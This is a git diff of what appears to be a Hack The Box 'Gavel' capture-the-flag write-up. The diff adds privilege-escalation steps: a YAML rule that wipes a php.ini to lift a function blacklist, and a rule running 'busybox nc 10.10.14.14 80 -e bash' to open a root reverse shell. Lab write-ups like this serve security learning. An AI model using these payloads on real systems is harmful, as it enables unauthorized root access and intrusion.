@@ -2,17 +2,21 @@
 title: HTB-Gavel
 published: 2025-12-01
 toc: true
-draft: true
+draft: false
 tags:
   - "git"
   - "git-dumper"
+  - "SQLi"
+  - "ffuf"
+  - "PHP"
 ---
+
+import PasswordProtect from '~/components/PasswordProtect.client';
 
 ```
 Scope:
 10.10.11.97
 ```
-
 # Recon
 ## Nmap
 
@@ -36,6 +40,8 @@ PORT      STATE    SERVICE        REASON      VERSION
 ```
 
 Right away I notice that a `git` repo was found, let's enumerate it with `git-dumper`.
+
+<PasswordProtect client:load>
 
 ## git-dumper
 
@@ -206,7 +212,7 @@ I could find that all the `php` shell commands were blacklisted in the `/opt/gav
 
 ![](attachments/17333f6e465f68c9bdb060623cf89e34.png)
 
-This meant I'd need to use `gavel-util` to write a malicious rule as follows:
+This meant I'd need to use `gavel-util` to write a malicious rule as follows and execute it:
 
 ```yaml
 name: "Test"
@@ -214,33 +220,34 @@ description: "Testing test"
 image: "https://sample.website"
 price: 10000
 rule_msg: "Your bid must be 20% higher than the previous bid"
-rule: "file_put_contents('/opt/gavel/.config/php/php.ini', '');"
+rule: "file_put_contents('/opt/gavel/.config/php/php.ini', ''); return false;"
 ```
 
-![](attachments/1c0acd1c0b89eac5e57cf5605a3a921f.png)
+![](attachments/e3511e6bb979bd024a83e71a20002146.png)
 
+Now that the file was overwritten I verified whether it executed correctly:
 
+![](attachments/bcb510d150fb4fc6a53a3794dd867907.png)
 
+Empty, good! Now it was time to give myself a *root* reverse shell:
 
+```yaml
+name: "Test"
+description: "Testing test"
+image: "https://sample.website"
+price: 10000
+rule_msg: "Your bid must be 20% higher than the previous bid"
+rule: "return system('busybox nc 10.10.14.14 80 -e bash');"
+```
 
+![](attachments/890dc5cba3b1908602a9c7eabcb4a60c.png)
 
+### root.txt
 
+![](attachments/5204f4cfdf4dc678720a591909511870.png)
 
+![](attachments/bcfd2a23b19b6f323db484ba3f934328.png)
 
+</PasswordProtect>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
----
+--- 
